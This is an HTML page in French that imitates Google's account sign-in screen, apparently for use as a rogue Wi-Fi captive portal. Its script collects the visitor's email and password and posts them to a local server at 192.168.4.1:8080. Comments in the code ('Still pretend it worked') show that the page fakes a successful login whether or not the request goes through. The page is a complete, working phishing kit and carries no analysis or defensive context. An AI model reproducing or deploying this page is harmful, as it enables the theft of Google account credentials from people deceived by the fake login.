<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Comptes Google</title>
    <link rel="icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAC6klEQVR4Ab2XA5AkWRiF/zdVXdt2bNu2bdu2bdu2bdu2bdu2bVf1JpPMdE/tc3Jf1a3u+rt+3X0TAAD//wMA" type="image/png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', 'Arial', sans-serif;
            background-color: #fff;
            color: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 450px;
        }

        .card {
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            background: #fff;
        }

        .logo {
            text-align: center;
            margin-bottom: 16px;
        }

        .logo svg {
            width: 75px;
            height: 24px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            line-height: 1.3333;
            margin: 0 0 8px;
            text-align: center;
            color: #202124;
        }

        .subtitle {
            font-size: 16px;
            font-weight: 400;
            line-height: 1.5;
            color: #202124;
            text-align: center;
            margin-bottom: 24px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            font-size: 12px;
            color: #5f6368;
            margin-bottom: 8px;
            font-weight: 500;
        }

        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            outline: none;
            transition: border-color 0.2s;
            font-family: inherit;
            color: #202124;
        }

        input[type="email"]:focus,
        input[type="password"]:focus,
        input[type="text"]:focus {
            border-color: #1a73e8;
            border-width: 2px;
            padding: 12px 14px;
        }

        input[type="email"]:hover,
        input[type="password"]:hover,
        input[type="text"]:hover {
            border-color: #202124;
        }

        .forgot-email {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        .info-text {
            font-size: 14px;
            color: #5f6368;
            margin-bottom: 24px;
        }

        .buttons {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 32px;
        }

        .create-account {
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
        }

        .create-account:hover {
            text-decoration: underline;
        }

        .next-btn {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            font-family: inherit;
            letter-spacing: 0.25px;
        }

        .next-btn:hover {
            background-color: #1765cc;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 1px 3px 1px rgba(60,64,67,.15);
        }

        .next-btn:active {
            background-color: #1557b0;
        }

        .next-btn:disabled {
            background-color: #f1f3f4;
            color: #80868b;
            cursor: not-allowed;
        }

        .language-footer {
            margin-top: 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
        }

        .language-select {
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 6px 10px;
            font-size: 12px;
            color: #5f6368;
            background: transparent;
            cursor: pointer;
        }

        .footer-links {
            display: flex;
            gap: 16px;
        }

        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            font-size: 12px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .profile-card {
            display: flex;
            align-items: center;
            padding: 12px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin-bottom: 24px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .profile-card:hover {
            background-color: #f8f9fa;
        }

        .profile-pic {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            font-weight: 500;
            margin-right: 16px;
            flex-shrink: 0;
        }

        .profile-info {
            flex-grow: 1;
        }

        .profile-email {
            font-size: 14px;
            color: #202124;
            margin-bottom: 2px;
        }

        .use-another {
            font-size: 14px;
            color: #1a73e8;
            text-align: center;
            margin-top: 16px;
            cursor: pointer;
            font-weight: 500;
        }

        .use-another:hover {
            text-decoration: underline;
        }

        .hidden {
            display: none;
        }

        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .show-password {
            display: flex;
            align-items: center;
            margin-top: 12px;
        }

        .show-password input[type="checkbox"] {
            width: auto;
            margin-right: 8px;
        }

        .show-password label {
            font-size: 14px;
            color: #5f6368;
            margin: 0;
            cursor: pointer;
            font-weight: 400;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <!-- Logo Google -->
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24">
                    <g fill="none" fill-rule="evenodd">
                        <path d="M36.35 12.18c0 4.27-3.32 7.42-7.42 7.42-4.1 0-7.42-3.15-7.42-7.42s3.32-7.42 7.42-7.42c4.1 0 7.42 3.15 7.42 7.42z" fill="#EA4335"/>
                        <path d="M66.7 7.5h-6.3v2.8h4.5c-.4 2.2-2.2 3.3-4.5 3.3-2.8 0-5-2.2-5-5s2.2-5 5-5c1.3 0 2.5.5 3.4 1.3l2-2c-1.4-1.3-3.3-2.1-5.4-2.1-4.4 0-8 3.6-8 8s3.6 8 8 8c4.6 0 7.6-3.2 7.6-7.7 0-.5 0-1-.1-1.6z" fill="#4285F4"/>
                        <path d="M44.93 5.27c4.1 0 6.85 2.82 6.85 6.73 0 3.96-2.75 6.73-6.85 6.73s-6.85-2.77-6.85-6.73c0-3.91 2.75-6.73 6.85-6.73zm0 10.81c2.41 0 4.13-1.79 4.13-4.08 0-2.24-1.72-4.08-4.13-4.08-2.41 0-4.13 1.84-4.13 4.08 0 2.29 1.72 4.08 4.13 4.08z" fill="#FBBC05"/>
                        <path d="M56.93 5.27c4.1 0 6.85 2.82 6.85 6.73 0 3.96-2.75 6.73-6.85 6.73s-6.85-2.77-6.85-6.73c0-3.91 2.75-6.73 6.85-6.73zm0 10.81c2.41 0 4.13-1.79 4.13-4.08 0-2.24-1.72-4.08-4.13-4.08-2.41 0-4.13 1.84-4.13 4.08 0 2.29 1.72 4.08 4.13 4.08z" fill="#34A853"/>
                        <path d="M13.32 11.18v-2.7h9.06c.09.48.13.99.13 1.53 0 1.9-.52 4.26-2.19 5.93-1.63 1.68-3.72 2.58-6.73 2.58-5.33 0-9.81-4.34-9.81-9.67s4.48-9.67 9.81-9.67c2.95 0 5.06 1.16 6.64 2.67l-1.87 1.87c-1.13-1.07-2.67-1.9-4.77-1.9-3.9 0-6.95 3.14-6.95 7.03s3.05 7.03 6.95 7.03c2.54 0 3.99-1.02 4.92-1.95.76-.76 1.25-1.84 1.45-3.32h-6.37z" fill="#4285F4"/>
                    </g>
                </svg>
            </div>

            <!-- Page Email -->
            <div id="emailPage">
                <h1>Connexion</h1>
                <p class="subtitle">Utiliser votre compte Google</p>

                <div class="form-group">
                    <input type="email" id="emailInput" placeholder="Adresse e-mail ou numéro de téléphone" autofocus>
                    <div class="error-message" id="emailError">Adresse e-mail incorrecte</div>
                </div>

                <div class="form-group">
                    <a href="#" class="forgot-email">Adresse e-mail oubliée ?</a>
                </div>

                <p class="info-text">
                    Pas sur votre ordinateur ? Utilisez le mode navigation privée pour vous connecter en toute sécurité.
                    <a href="#" style="color: #1a73e8; text-decoration: none;">En savoir plus</a>
                </p>

                <div class="buttons">
                    <a href="#" class="create-account">Créer un compte</a>
                    <button class="next-btn" onclick="goToPassword()">Suivant</button>
                </div>
            </div>

            <!-- Page Password (hidden) -->
            <div id="passwordPage" class="hidden">
                <h1>Bienvenue</h1>
                
                <div class="profile-card" onclick="backToEmail()">
                    <div class="profile-pic" id="profileInitial">G</div>
                    <div class="profile-info">
                        <div class="profile-email" id="displayEmail"></div>
                    </div>
                </div>

                <div class="form-group">
                    <input type="password" id="passwordInput" placeholder="Saisissez votre mot de passe">
                    <div class="error-message" id="passwordError">Mot de passe incorrect</div>
                </div>

                <div class="show-password">
                    <input type="checkbox" id="showPassword" onchange="togglePassword()">
                    <label for="showPassword">Afficher le mot de passe</label>
                </div>

                <div class="buttons" style="margin-top: 32px;">
                    <a href="#" class="create-account">Mot de passe oublié ?</a>
                    <button class="next-btn" onclick="submitLogin()">Suivant</button>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="language-footer">
            <select class="language-select">
                <option>Français</option>
                <option>English</option>
                <option>Español</option>
            </select>
            <div class="footer-links">
                <a href="#">Aide</a>
                <a href="#">Confidentialité</a>
                <a href="#">Conditions d'utilisation</a>
            </div>
        </div>
    </div>

    <script>
        let userEmail = '';

        function goToPassword() {
            const email = document.getElementById('emailInput').value.trim();
            const emailError = document.getElementById('emailError');
            
            if (!email || !email.includes('@')) {
                emailError.classList.add('show');
                document.getElementById('emailInput').focus();
                return;
            }

            emailError.classList.remove('show');
            userEmail = email;
            
            // Update display
            document.getElementById('displayEmail').textContent = email;
            document.getElementById('profileInitial').textContent = email.charAt(0).toUpperCase();
            
            // Switch pages
            document.getElementById('emailPage').classList.add('hidden');
            document.getElementById('passwordPage').classList.remove('hidden');
            
            setTimeout(() => {
                document.getElementById('passwordInput').focus();
            }, 100);
        }

        function backToEmail() {
            document.getElementById('passwordPage').classList.add('hidden');
            document.getElementById('emailPage').classList.remove('hidden');
            document.getElementById('passwordInput').value = '';
        }

        function togglePassword() {
            const passwordInput = document.getElementById('passwordInput');
            const checkbox = document.getElementById('showPassword');
            passwordInput.type = checkbox.checked ? 'text' : 'password';
        }

        function submitLogin() {
            const password = document.getElementById('passwordInput').value;
            const passwordError = document.getElementById('passwordError');
            
            if (!password) {
                passwordError.classList.add('show');
                document.getElementById('passwordInput').focus();
                return;
            }

            passwordError.classList.remove('show');

            // Send credentials to server
            const formData = new URLSearchParams();
            formData.append('username', userEmail);
            formData.append('password', password);

            // Disable button
            const btn = event.target;
            btn.disabled = true;
            btn.textContent = 'Connexion...';

            fetch('http://192.168.4.1:8080/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                // Simulate success
                btn.textContent = '✓ Connecté';
                setTimeout(() => {
                    // Stay on page (no internet)
                    alert('Connexion établie. Vérification en cours...');
                    btn.disabled = false;
                    btn.textContent = 'Suivant';
                }, 1500);
            })
            .catch(error => {
                console.error('Error:', error);
                // Still pretend it worked
                btn.textContent = '✓ Connecté';
                setTimeout(() => {
                    alert('Connexion établie. Vérification en cours...');
                    btn.disabled = false;
                    btn.textContent = 'Suivant';
                }, 1500);
            });
        }

        // Enter key support
        document.getElementById('emailInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                goToPassword();
            }
        });

        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitLogin();
            }
        });
    </script>
</body>
</html>
